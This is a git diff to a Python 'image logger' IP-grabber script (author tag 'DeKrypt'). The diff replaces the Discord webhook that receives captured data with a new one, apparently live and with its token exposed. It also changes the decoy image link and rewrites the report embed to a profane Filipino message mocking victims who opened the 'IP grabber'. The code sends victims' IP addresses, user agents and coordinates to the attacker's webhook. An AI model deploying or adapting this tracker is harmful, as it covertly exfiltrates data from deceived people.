@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1441362949360062504/pElhXZwiG7GaSsmv0-w5bsiTdTTNBOkAfj4SCSA0NHxvLt3KcAXLXB-P8apa_7qSWb0W",
-    "image": "https://wallpaperaccess.com/full/2834349.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1454018139871514777/kFI0bSxwY7ecRm8tvtd5Xt7r_cthTpajyhx4tqm-Ce3_CHrldGv9ciGSRMnbJnBLVivZ",
+    "image": "https://cdn.discordapp.com/attachments/1421066702111641651/1454017285449715774/united_logo.jpg?ex=694f8e9f&is=694e3d1f&hm=811c4bce654ea0b0319a9a4f3fc45ad7c166477dbe1e7e715f08c6f214bd4990&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -144,9 +144,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "FUCKER NGA PALA NI 777ZNT💉",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**MAY TANGANG NAG OPEN NG IP GRABBER NI 777**
 
 **Endpoint:** `{endpoint}`
             
